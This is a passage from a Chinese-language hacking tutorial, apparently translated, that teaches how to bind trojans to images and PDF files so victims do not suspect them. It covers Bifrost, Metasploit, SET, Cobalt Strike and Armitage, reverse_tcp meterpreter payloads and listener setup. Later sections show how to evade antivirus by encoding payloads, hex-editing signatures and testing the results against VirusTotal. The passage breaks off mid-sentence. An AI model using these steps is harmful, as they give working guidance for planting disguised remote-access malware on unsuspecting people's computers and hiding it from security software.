  trans: "\n\n### j) 打封装\n是将程序与图片合并，这样客户端就不会怀疑是木马了。![](img/image-07chnpi0.jpg) ![](img/image-5k81cqy1.jpg)\
    \ 在 Bifrost 中创建服务器。使用单播 sfx 编译器将木马和图片合并 ![](img/image-s22ttjwy.jpg) \n\n你可以使用\
    \ `kabo icon changer` 来更改图标 ![](img/image-zkbc4r3z.jpg) 你也可以使用 `winrar` 或 `iexpress`。\n\
    \n### k) 通过 Metasploit 打封装\n![](img/image-8w1g18rw.jpg) 我们使用以下利用程序：\n\n![](img/image-1swl5gwj.jpg)\
    \ 在 `msfconsole` 中生成载荷。给 `LHOST` 指定黑客电脑的 DNS 名称，给 `LPORT` 指定我们希望木马程序监听的端口、文件名，以及我们想要与载荷合并的\
    \ `pdf` 文件。\n\n![](img/image-6q2qwtbw.jpg) 运行多重处理器（multi handler）。向其提供载荷信息。用 `pdf`\
    \ 文件感染客户端，你将进入 `meterpreter session`。\n\n![](img/image-zqew6c1z.jpg) ![](img/image-ra2wn000.jpg)\n\
    \n#### 通过 Set 工具打封装\n```bash\n./se-toolkit\n```\n选择 1 进行社会工程攻击。![](img/image-u2foiulu.jpg)\
    \ 选择 3 进行感染媒介生成器![](img/image-873t64hn.jpg) 选择 1 进行文件格式利用![](img/image-9sc7c72k.jpg)\
    \ \n\n填入载荷用于反向连接的 IP。选择 11 进行嵌入 `pdf exe` 社会工程攻击 ![](img/image-dexo2ebf.jpg) 选择载荷类型为\
    \ 2，即 `windows meterpreter reverse_tcp` ![](img/image-6uj172v9.jpg) 输入监听器的 IP\
    \ 和端口号![](img/image-1e136bc9.jpg) 你将在 `/root/pentest/exploits/set/autorun/template.pdf`\
    \ 找到该文件，那里有一个 `autorun.inf` 文件。在客户端电脑中获取该文件并运行。`meterpreter session` 将会打开。\n\n\
    ![](img/image-2jkpak8e.jpg)\n\n### l) 使用 Linux 打封装\nCoalt Strike 在可以封装方面比 Armitage\
    \ 更好![](img/image-d0bpin1l.jpg) ![](img/image-w97lowlw.jpg) 生成 `exe` 文件。搜索 `windows/meterpreter/reverse_tcp`\
    \ 载荷。填入监听器的 IP 和端口号。生成 `exe` 文件 ![](img/image-o1t1tr3d.jpg) ![](img/image-amle6d0q.jpg)\n\
    \n要在多重处理器中工作，选择相同的载荷并填相同的监听器 IP 和端口号。选择输出为 multi handler ![](img/image-0jqms4oy.jpg)\
    \ 要与 `pdf` 文件合并，进入菜单：attacks、packages、adobe pdf。选择 `pdf` 文件和服务器文件 ![](img/image-486m57ve.jpg)\n\
    \n当你在客户端机器上运行感染文件时，你将看到它 ![](img/image-ekms061o.jpg)\n\n### m) 对木马以防杀毒软件检测\n![](img/image-mjukbgje.jpg)\
    \ 杀毒软件在检测任何病毒、恶意软件或木马时，可以通过两种方式工作：基于签名或基于行为。杀毒软件拥有一个包含代码的数据库，当它在扫描的文件中发现这些代码时，它就会识别出那是某个名称的木马或病毒。基于行为的检测则可以查看程序运行时的行为。通过程序的行为，它可以检测其是否为病毒或木马。大多数程序是基于签名的工作，有些是基于行为的。\n\
    \n有些网站提供多引擎病毒扫描功能，可以使用多种杀毒软件扫描任何文件。`Virustotal.com` 可以用 46 种引擎进行扫描![](img/image-xfuc21gd.jpg)\
    \ 你可以加密木马并在 `virustotal.com` 中扫描它，但那会让杀毒软件通过 `virustotal.com` 检测到你的木马。使用 `xencode`\
    \ 程序对程序 `customized.exe` 进行编码。\n\n![](img/image-sx4fad84.jpg) 你可以使用 `hex workshop`\
    \ 程序对文件加密。通过试错查找包含病毒签名的部分并修改其中的一个字母，这样文件就不会被杀毒软件检测。\n\n### n) 在 Metasploit 中编码\n\
    ![](img/image-ttsiyac4.jpg) Metasploit 有一些我们在生成载荷时可以使用的编码器。要查看 metasploit 中的编码器，输入：\n\
    ```bash\nmsfconsole\n```\n`Msf> use payload/windows/meterpreter/reverse_tcp`\n\
    `Msf> show encoders`\n\n最好的是 `x86/shikata_gani`。使用该编码器生成载荷：\n```bash\nMSf> generate\
    \ –t exe –f Mahmoud –e x86/shikata_gani\n```\n![](img/image-58zcwzbq.jpg) 下载 armitage：\n\
    ```bash\napt-get install armitage\n```\n启动 sql 服务：\n```bash\nservice postgresql\
    \ start\n```\n启动 `armitage`。\n\n进入 windows 然后 meterpreter 然后 reverse_tcp 选择编码器以及\
    \ `LHOST` 和 `LPORT`，它们是黑客机器监听载荷的 IP 地址和端口。选择输出文件为 `exe` 文件 ![](img/image-sit7ido7.jpg)\
    \ 在 `virustotal` 中扫描文件> 你看到它被 35 个杀毒软件检测到\n\n![](img/image-vkb73vnx.jpg) 我们可以使用\
    \ `AVOID` 脚本进行加密。我们需要先安装 `mingw32`。运行 shell 并向其提供必要信息，你将在 autorun 文件夹中获得木马 ![](img/image-1onp6whf.jpg\
    \ ![](image-gqlxtje5.jpg) ![](img/image-v33jrlo9.jpg)\n\n当我们扫描文件时，发现它被 46 个杀毒软件中的\
